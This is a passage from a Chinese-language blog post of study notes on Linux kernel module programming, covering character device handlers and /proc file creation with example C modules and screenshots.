class="params">			   <span class="type">size_t</span> length,	<span class="comment">/* length of the buffer     */</span></span></span><br><span class="line"><span class="params">			   <span class="type">loff_t</span> * offset)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Number of bytes actually written to the buffer </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span> bytes_read = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we&#x27;re at the end of the message, </span></span><br><span class="line"><span class="comment">	 * return 0 signifying end of file </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (*msg_Ptr == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * Actually put the data into the buffer </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">while</span> (length &amp;&amp; *msg_Ptr) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* </span></span><br><span class="line"><span class="comment">		 * The buffer is in the user data segment, not the kernel </span></span><br><span class="line"><span class="comment">		 * segment so &quot;*&quot; assignment won&#x27;t work.  We have to use </span></span><br><span class="line"><span class="comment">		 * put_user which copies data from the kernel data segment to</span></span><br><span class="line"><span class="comment">		 * the user data segment. </span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		put_user(*(msg_Ptr++), buffer++);</span><br><span class="line"></span><br><span class="line">		length--;</span><br><span class="line">		bytes_read++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * Most read functions return the number of bytes put into the buffer</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> bytes_read;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> * Called when a process writes to dev file: echo &quot;hi&quot; &gt; /dev/hello </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">device_write</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">const</span> <span class="type">char</span> *buff, <span class="type">size_t</span> len, <span class="type">loff_t</span> * off)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_ALERT <span class="string">&quot;Sorry, this operation isn&#x27;t supported.\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到成功装载模块，<code>major number506</code>。</p>
<img src="/posts/79c0f484/image-20240114145543938.png" class="" title="image-20240114145543938">

<p>使用<code>mknod</code>命令创建新设备驱动文件，读取内容，可以看到次数发生改变。无写入权限。</p>
<img src="/posts/79c0f484/image-20240114145523551.png" class="" title="image-20240114145523551">



<h4 id="4-1-6-兼容多个版本的内核模块"><a href="#4-1-6-兼容多个版本的内核模块" class="headerlink" title="4.1.6 兼容多个版本的内核模块"></a>4.1.6 兼容多个版本的内核模块</h4><p><strong>内核暴露给进程的系统调用在各个版本之间基本一致。可能会加入新的系统调用，但是旧的调用的行为会保持不变（向后兼容）。</strong>不过有一些系统版本（奇数：开发版）会有改变。</p>
<p>为了适应不同版本，需要编写条件编译指令。将<code>LINUX_VERSION_CODE</code>与<code>KERNEL_VERSION</code>进行比较。如果内核版本为<code>a.b.c</code>，宏的值应为<code>$2^&#123;16&#125;a+2^&#123;8&#125;b+c$</code></p>
<h2 id="Chapter-5-The-proc-File-System"><a href="#Chapter-5-The-proc-File-System" class="headerlink" title="Chapter 5. The &#x2F;proc File System"></a>Chapter 5. The &#x2F;proc File System</h2><h3 id="5-1-The-proc-File-System"><a href="#5-1-The-proc-File-System" class="headerlink" title="5.1 The &#x2F;proc File System"></a>5.1 The &#x2F;proc File System</h3><p>在Linux系统中，内核和内核模块有一种另外的方式与进程通信——&#x2F;proc 文件系统。&#x2F;proc文件系统最初的设计是为了方便访问进程信息，现在它被内核广泛调用来获取信息。</p>
<p>使用&#x2F;proc文件系统的方法与设备驱动程序相似，使用&#x2F;proc文件所需信息创建一个结构体，包括指向处理函数的指针。然后<code>init_module</code>注册该结构，<code>cleanup_module</code>注销。</p>
<p>为避免冲突，使用<code>proc_register_dynamic</code>来让内核决定<code>inode number</code>，与普通的文件系统不同，<code>/proc</code>文件系统位于内存中。在正常情况下，<code>inode number</code>是指向文件在磁盘位置的指针。<code>inode</code>包含文件的基本信息，例如权限，硬盘位置指针。</p>
<p>在以下代码中，打开&#x2F;关闭文件并不会调用函数，因此不会放入<code>try_module_get</code>和<code>try_module_put</code>函数，如果文件被打开时模块被删除，那么会导致内存访问越界。</p>
<p>当使用<code>proc_create</code>函数加载模块时，将创建<code>/proc/helloworld</code>返回值是一个结构体<code>struct proc_dir_entry</code>，并且该结构体会用于配置<code>/proc/helloworld</code>，例如文件拥有者。若返回空，则表明创建失败。</p>
<p>每当文件<code>/proc/helloworld</code>被读取时，函数<code>procfs_read</code>会被调用。有两个参数比较重要<code>buffer： 返回给读取文件应用进程的内容</code>, <code>offset： 当前文件的位置</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  procfs1.c -  create a &quot;file&quot; in /proc</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Specifically, a module */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* We&#x27;re doing kernel work */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span>	<span class="comment">/* Necessary because we use the proc fs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">proc_parent</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> len, temp;</span><br><span class="line"><span class="type">char</span> *msg;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">read_proc</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> *offp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(count &gt; temp)</span><br><span class="line">		count = temp;</span><br><span class="line">	temp = temp-count;</span><br><span class="line"></span><br><span class="line">	raw_copy_to_user(buf, msg, count);</span><br><span class="line">	<span class="keyword">if</span>(count == <span class="number">0</span>)</span><br><span class="line">		temp = len;</span><br><span class="line">	<span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">proc_fops</span> =</span> &#123;</span><br><span class="line">	.proc_read = read_proc</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_new_proc_entry</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*create a file named world, and read attribute to this file using proc_fops*/</span></span><br><span class="line">	proc_create(<span class="string">&quot;world&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;proc_fops);</span><br><span class="line">	msg = <span class="string">&quot;hello world\n&quot;</span>;		<span class="comment">/*file content*/</span></span><br><span class="line">	len = <span class="built_in">strlen</span>(msg);</span><br><span class="line">	temp = len;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;1.len=%d&quot;</span>, len);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;proc initialized&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">proc_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	create_new_proc_entry();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">proc_cleanup</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Inside cleanup_module\n&quot;</span>);</span><br><span class="line">	remove_proc_entry(<span class="string">&quot;world&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">module_init(proc_init);</span><br><span class="line">module_exit(proc_cleanup);</span><br></pre></td></tr></table></figure>

<p>结果如下图所示：</p>
<img src="/posts/79c0f484/image-20240115091551536.png" class="" title="image-20240115091551536">

<h3 id="5-2-读写-proc文件"><a href="#5-2-读写-proc文件" class="headerlink" title="5.2 读写&#x2F;proc文件"></a>5.2 读写&#x2F;proc文件</h3><p>文件写入使用<code>copy_from_user</code>或<code>get_user</code>读取用户输入，与read不同。</p>
<p>使用<code>copy_from_user</code>或<code>get_user</code>函数的原因为Linux系统内存是分段的，指针指向内存地址不是实际内存上特定地址，而是一个内存段上的地址。内核有一个内存段，其他每个进程都有一个内存段。</p>
<p>每个进程都只能访问他自己的内存段，因此当编写作为进程运行的一般程序时，不需要担心此问题。当编写内核模块时，一般情况下系统会自动让你访问内核的内存段。然而，当内存缓冲区的内容需要在进程与内核之间传递时，内核函数会接受一个指向进程内存段的指针。<code>put_user</code>和<code>get_user</code>可以让你成功访问这些内存地址。不过这两个函数一次只能处理一个字符，可以使用<code>copy_to_user</code>和<code>copy_from_user</code>来处理字符串。由于buffer位于内和空间，因此对于写入操作而言你需要引入用户空间的数据，即只能使用<code>copy_from_user</code>函数，而读取操作因为数据本身就在内核态，可以不使用<code>copy_to_user</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  procfs2.c -  create a &quot;file&quot; in /proc</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Specifically, a module */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* We&#x27;re doing kernel work */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span>	<span class="comment">/* Necessary because we use the proc fs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/uaccess.h&gt;</span>	<span class="comment">/* for copy_from_user */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCFS_MAX_SIZE     1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCFS_NAME         <span class="string">&quot;bufferlk&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The buffer used to store character for this module</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> procfs_buffer[PROCFS_MAX_SIZE];</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The size of the buffer</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> procfs_buffer_size = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * This function is called then the /proc file is read</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">read_proc</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, <span class="type">size_t</span> count, <span class="type">loff_t</span> *offp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;procfile_read (/proc/%s) called\n&quot;</span>, PROCFS_NAME);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Read data: %s&quot;</span>, procfs_buffer);</span><br><span class="line">    <span class="keyword">if</span> (*offp &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* we have finished to read, return 0 */</span></span><br><span class="line">        ret = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* fill the buffer, return the buffer size*/</span></span><br><span class="line">        copy_to_user(buf, procfs_buffer, procfs_buffer_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This function is called with the /proc file is written</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">write_proc</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">const</span> <span class="type">char</span> __user *buffer, <span class="type">size_t</span> count,</span></span><br><span class="line"><span class="params">		   <span class="type">loff_t</span> *offp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* get buffer size */</span></span><br><span class="line">	procfs_buffer_size = count;</span><br><span class="line">	<span class="keyword">if</span> (procfs_buffer_size &gt; PROCFS_MAX_SIZE ) &#123;</span><br><span class="line">		procfs_buffer_size = PROCFS_MAX_SIZE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* write data to the buffer */</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> ( copy_from_user(procfs_buffer, buffer, procfs_buffer_size) ) &#123;</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	&#125;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Write data: %s&quot;</span>, procfs_buffer);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> procfs_buffer_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">proc_fops</span> =</span> &#123;</span><br><span class="line">    .proc_read = read_proc,</span><br><span class="line">    .proc_write = write_proc,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *This function is called when the module is loaded</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* create the /proc file */</span></span><br><span class="line">	proc_create(PROCFS_NAME, <span class="number">0644</span>, <span class="literal">NULL</span>, &amp;proc_fops);</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;/proc/%s created\n&quot;</span>, PROCFS_NAME);	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	<span class="comment">/* everything is ok */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *This function is called when the module is unloaded</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	remove_proc_entry(PROCFS_NAME, <span class="literal">NULL</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;/proc/%s removed\n&quot;</span>, PROCFS_NAME);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Rita_Roseweisse&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>写入并读取内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo sh -c &#x27;echo &quot;I LOVE YOU&quot; &gt; /proc/bufferlk&#x27;</span><br><span class="line">❯ cat /proc/bufferlk</span><br></pre></td></tr></table></figure>

<img src="/posts/79c0f484/%E6%88%AA%E5%9B%BE%202024-01-15%2010-34-28.png" class="" title="截图 2024-01-15 10-34-28">

<h3 id="5-3-Manage-proc-file-with-standard-filesystem"><a href="#5-3-Manage-proc-file-with-standard-filesystem" class="headerlink" title="5.3 Manage &#x2F;proc file with standard filesystem"></a>5.3 Manage &#x2F;proc file with standard filesystem</h3><p>还可以使用inode来管理&#x2F;proc文件，好处是可以使用一些高级函数，例如权限。</p>
<p>Linux系统中，对于文件系统注册有一套标准的方法。因为每一个文件系统都有它自己的操作函数来管理inode和文件操作，需要一个结构体来指向这些函数，结构体<code>struct inode_operations</code>，该结构体包含<code>proc_ops</code>。</p>
<p>文件操作与inode操作的区别在于，文件操作处理文件本身，而inode操作处理引用文件的方式，例如创建到该文件的链接。</p>
<p>还有个函数<code>module_permission</code>。当进程要对&#x2F;proc文件进行操作时会先调用此函数，查看是否有权限来进行操作。</p>
<p>注：内核的read和write函数的作用与正常程序相反，read函数用于输出，write函数用于输入。因为如果进程要从内核中读取数据，内核需要输出，写入数据时，内核是接受数据。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * procfs3.c </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/version.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LINUX_VERSION_CODE &gt;= KERNEL_VERSION(5, 10, 0) </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/minmax.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LINUX_VERSION_CODE &gt;= KERNEL_VERSION(5, 6, 0) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HAVE_PROC_OPS </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCFS_MAX_SIZE 2048UL </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROCFS_ENTRY_FILENAME <span class="string">&quot;buffer2k&quot;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">our_proc_file</span>;</span> </span><br><span class="line"><span class="type">static</span> <span class="type">char</span> procfs_buffer[PROCFS_MAX_SIZE]; </span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> procfs_buffer_size = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">procfs_read</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buffer, </span></span><br><span class="line"><span class="params">                           <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">if</span> (*offset || procfs_buffer_size == <span class="number">0</span>) &#123; </span><br><span class="line">        pr_debug(<span class="string">&quot;procfs_read: END\n&quot;</span>); </span><br><span class="line">        *offset = <span class="number">0</span>; </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    procfs_buffer_size = min(procfs_buffer_size, length); </span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(buffer, procfs_buffer, procfs_buffer_size)) </span><br><span class="line">        <span class="keyword">return</span> -EFAULT; </span><br><span class="line">    *offset += procfs_buffer_size; </span><br><span class="line"> </span><br><span class="line">    pr_debug(<span class="string">&quot;procfs_read: read %lu bytes\n&quot;</span>, procfs_buffer_size); </span><br><span class="line">    <span class="keyword">return</span> procfs_buffer_size; </span><br><span class="line">&#125; </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">procfs_write</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">const</span> <span class="type">char</span> __user *buffer, </span></span><br><span class="line"><span class="params">                            <span class="type">size_t</span> len, <span class="type">loff_t</span> *off)</span> </span><br><span class="line">&#123; </span><br><span class="line">    procfs_buffer_size = min(PROCFS_MAX_SIZE, len); </span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(procfs_buffer, buffer, procfs_buffer_size)) </span><br><span class="line">        <span class="keyword">return</span> -EFAULT; </span><br><span class="line">    *off += procfs_buffer_size; </span><br><span class="line"> </span><br><span class="line">    pr_debug(<span class="string">&quot;procfs_write: write %lu bytes\n&quot;</span>, procfs_buffer_size); </span><br><span class="line">    <span class="keyword">return</span> procfs_buffer_size; </span><br><span class="line">&#125; </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">procfs_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> </span><br><span class="line">&#123; </span><br><span class="line">    try_module_get(THIS_MODULE); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">procfs_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span> </span><br><span class="line">&#123; </span><br><span class="line">    module_put(THIS_MODULE); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_PROC_OPS </span></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">file_ops_4_our_proc_file</span> =</span> &#123; </span><br><span class="line">    .proc_read = procfs_read, </span><br><span class="line">    .proc_write = procfs_write, </span><br><span class="line">    .proc_open = procfs_open, </span><br><span class="line">    .proc_release = procfs_close, </span><br><span class="line">&#125;; </span><br><span class="line"><span class="meta">#<span class="keyword">else</span> </span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">file_ops_4_our_proc_file</span> =</span> &#123; </span><br><span class="line">    .read = procfs_read, </span><br><span class="line">    .write = procfs_write, </span><br><span class="line">    .open = procfs_open, </span><br><span class="line">    .release = procfs_close, </span><br><span class="line">&#125;; </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">procfs3_init</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    our_proc_file = proc_create(PROCFS_ENTRY_FILENAME, <span class="number">0644</span>, <span class="literal">NULL</span>, </span><br><span class="line">                                &amp;file_ops_4_our_proc_file); </span><br><span class="line">    <span class="keyword">if</span> (our_proc_file == <span class="literal">NULL</span>) &#123; </span><br><span class="line">        pr_debug(<span class="string">&quot;Error: Could not initialize /proc/%s\n&quot;</span>, </span><br><span class="line">                 PROCFS_ENTRY_FILENAME); </span><br><span class="line">        <span class="keyword">return</span> -ENOMEM; </span><br><span class="line">    &#125; </span><br><span class="line">    proc_set_size(our_proc_file, <span class="number">80</span>); </span><br><span class="line">    proc_set_user(our_proc_file, GLOBAL_ROOT_UID, GLOBAL_ROOT_GID); </span><br><span class="line"> </span><br><span class="line">    pr_debug(<span class="string">&quot;/proc/%s created\n&quot;</span>, PROCFS_ENTRY_FILENAME); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">procfs3_exit</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123; </span><br><span class="line">    remove_proc_entry(PROCFS_ENTRY_FILENAME, <span class="literal">NULL</span>); </span><br><span class="line">    pr_debug(<span class="string">&quot;/proc/%s removed\n&quot;</span>, PROCFS_ENTRY_FILENAME); </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">module_init(procfs3_init); </span><br><span class="line">module_exit(procfs3_exit); </span><br><span class="line"> </span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure>

<img src="/posts/79c0f484/image-20240115143522039.png" class="" title="image-20240115143522039">

<h3 id="5-4-Manage-proc-file-with-seq-file"><a href="#5-4-Manage-proc-file-with-seq-file" class="headerlink" title="5.4 Manage &#x2F;proc file with seq_file"></a>5.4 Manage &#x2F;proc file with seq_file</h3><p>前面的构建&#x2F;proc文件过程比较复杂。因此为了更方便的写&#x2F;proc文件，提供了<code>seq_file</code>api用于格式化&#x2F;proc文件。<code>seq_file</code>根据时序分为三个函数: <code>start()</code>, <code>next()</code>, <code>stop()</code>。当用户读取&#x2F;proc文件时，<code>seq_file</code>会新建一个时序。</p>
<p>时序以<code>start()</code>为开始。如果返回值不为空，则继续调用<code>next()</code>函数。该函数为一个迭代器，可以遍历所有的数据。每次<code>next()</code>函数调用，都会调用<code>show()</code>函数。<code>show()</code>函数会在用户读取的缓冲区中写入数据值。当函数返回空值后结束循环。然后<code>stop()</code>函数被调用。<code>stop()</code>函数调用结束后，会继续调用<code>start()</code>函数，直到<code>start()</code>函数返回空值结束。</p>
<img src="/posts/79c0f484/lkmpg-for-ht1x-1705301053942-4.svg" class="" title="lkmpg-for-ht1x">

<p>注：<code>seq_file</code>为<code>proc_ops</code>提供了基本的函数，例如<code>seq_read</code>, <code>seq_lseek</code>等。但是没有写入的函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * procfs4.c -  create a &quot;file&quot; in /proc </span></span><br><span class="line"><span class="comment"> * This program uses the seq_file library to manage the /proc file. </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span> <span class="comment">/* We are doing kernel work */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span> <span class="comment">/* Specifically, a module */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/proc_fs.h&gt;</span> <span class="comment">/* Necessary because we use proc fs */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seq_file.h&gt;</span> <span class="comment">/* for seq_file */</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/version.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> LINUX_VERSION_CODE &gt;= KERNEL_VERSION(5, 6, 0) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HAVE_PROC_OPS </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROC_NAME <span class="string">&quot;iter&quot;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This function is called at the beginning of a sequence. </span></span><br><span class="line"><span class="comment"> * ie, when: </span></span><br><span class="line"><span class="comment"> *   - the /proc file is read (first time) </span></span><br><span class="line"><span class="comment"> *   - after the function stop (end of sequence) </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">my_seq_start</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">loff_t</span> *pos)</span> </span><br><span class="line">&#123; </span><br><span class="line">    <span class="type">static</span> <span class="type">unsigned</span> <span class="type">long</span> counter = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* beginning a new sequence? */</span> </span><br><span class="line">    <span class="keyword">if</span> (*pos == <span class="number">0</span>) &#123; </span><br><span class="line">        <span class="comment">/* yes =&gt; return a non null value to begin the sequence */</span> </span><br><span class="line">        <span class="keyword">return</span> &amp;counter; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* no =&gt; it is the end of the sequence, return end to stop reading */</span> </span><br><span class="line">    *pos = <span class="number">0</span>; </span><br><span class="line">    <span 